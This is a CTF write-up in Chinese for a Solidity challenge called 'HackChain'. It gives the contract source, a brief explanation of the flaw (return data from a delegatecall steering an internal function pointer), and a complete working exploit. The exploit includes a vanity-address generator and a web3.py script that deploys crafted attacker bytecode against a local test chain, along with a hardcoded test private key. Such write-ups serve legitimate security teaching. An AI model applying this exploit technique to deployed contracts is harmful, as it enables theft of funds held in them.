# HackChain

# Source

```
pragma solidity ^0.4.23;

contract HackChain {
    
    constructor() public payable {}
    
    bytes4 internal constant SET = bytes4(keccak256('getflag(uint256)'));
    
    event ForFlag(address addr);
    event Fail(address addr);
    
    struct Func {
        function() internal f;
    }
    
    function execute(address _target) public {
        
        require(uint(_target) & 0xfff == address(this).balance);
        require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false);
        
        bytes4 sel; 
        uint val;
        
        (sel, val) = getRet();
        require(sel == SET);
        
        Func memory func;
        func.f = payforflag;
        assembly { 
            // 0x02e4+val-balance=0x03c6
            mstore(func, sub(add(mload(func), val), balance(address)))
        }
        func.f();
    }
    
    function getRet() internal pure returns (bytes4 sel, uint val) {
        assembly {
            if iszero(eq(returndatasize, 0x24)) { revert(0, 0) }
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, 0x24)
            sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)
            val := mload(add(0x04, ptr))
        }
    }
    
    // 0x02E4
    function payforflag() public {
        require(keccak256(abi.encode(msg.sender))==0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        //0x03c6
        if(address(this).balance>1000){
            emit ForFlag(msg.sender);
        }else{
            emit Fail(msg.sender);
        }
    }
}
```

# Analyse
* 简单的逆向，考点是delegatecall安全调用+func任意跳转
* 前提是需要hack chain，预先知道balance
* 具体代码参考上面源代码

# Exp
* 发送下述json post请求，先获取balance

```
{
    "jsonrpc": "2.0",
    "method": "eth_blockNumber",
    "methoD": "eth_getBalance",
    "params": [
        "0x16a73a352f807764db6a5e040b642f2963a19170",
        "latest"
    ],
    "id": 1
}
```

* 我的例子中balance=0x5ea
* 攻击合约地址需要满足address&0xfff==balance，所以address低12位为0x5ea，使用如下脚本调用generate_eoa2生成即可

```
from ethereum import utils
import os, sys

# generate EOA with appendix 5ea
def generate_eoa1():
    priv = utils.sha3(os.urandom(4096))
    addr = utils.checksum_encode(utils.privtoaddr(priv))

    while not addr.lower().endswith("5ea"):
        priv = utils.sha3(os.urandom(4096))
        addr = utils.checksum_encode(utils.privtoaddr(priv))

    print('Address: {}\nPrivate Key: {}'.format(addr, priv.hex()))


# generate EOA with the ability to deploy contract with appendix 5ea
def generate_eoa2():
    priv = utils.sha3(os.urandom(4096))
    addr = utils.checksum_encode(utils.privtoaddr(priv))

    while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("5ea"):
        priv = utils.sha3(os.urandom(4096))
        addr = utils.checksum_encode(utils.privtoaddr(priv))


    print('Address: {}\nPrivate Key: {}'.format(addr, priv.hex()))


if __name__  == "__main__":
    if sys.argv[1] == "1":
        generate_eoa1()
    elif sys.argv[1] == "2":
        generate_eoa2()
    else:
        print("Please enter valid argument")
```

* 0x02e4+val-balance=0x03E8，根据逻辑关系得到val = 0x03c6+0x5ea-0x2e4 = 0x6cc
* 将下述的private0和public0替换为上述得到的EOA账户，运行下述exp，主要过程为部署攻击合约，得到攻击合约地址target，然后调用execute(target)

```
from web3 import Web3, HTTPProvider
import time

w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

contract_address = "0x16a73a352f807764db6a5e040b642f2963A19170"
private0 = "afb7037dd17037f9a1426cd04d21a1cec5ef43f8723642abd629981472ae6c85"
public0 = "0xab813636aC44021d5653aC3A5F6367bA51992D6c"

def do_callme(public, private, _to, _data, _value):
    txn = {
        'chainId': 8888,
        'from': Web3.toChecksumAddress(public),
        'to': _to,
        'gasPrice': w3.eth.gasPrice,
        'gas': 3000000,
        'nonce': w3.eth.getTransactionCount(Web3.toChecksumAddress(public)),
        'value': Web3.toWei(_value, 'ether'),
        'data': _data,
    }
    signed_txn = w3.eth.account.signTransaction(txn, private)
    txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
    txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
    print("txn_hash=", txn_hash)
    return txn_receipt

"""
contract hack {
    bytes4 internal constant SEL = bytes4(keccak256('getflag(uint256)'));

    function execute(address) public pure {
        bytes4 sel = SEL;
        assembly {
            mstore(0,sel)
            mstore(0x4,0x6cc)
            revert(0,0x24)
        }
    }
}
"""

data0 = '608060405234801561001057600080fd5b5060fa8061001f6000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634b64e492146044575b600080fd5b348015604f57600080fd5b506082600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506084565b005b600060405180807f676574666c61672875696e743235362900000000000000000000000000000000815250601001905060405180910390209050806000526106cc60045260246000fd00a165627a7a72305820a45eb958070353941dcb0c95d75404136be68e1d2b8e162ab8faa2410ec9a9c50029'

x = do_callme(public0, private0, '', data0, 0)
print(x)

time.sleep(1)

data1 = '0x4b64e492'+x['contractAddress'][2:].rjust(64,'0')
print(data1)

print(do_callme(public0, private0, contract_address, data1, 0))
```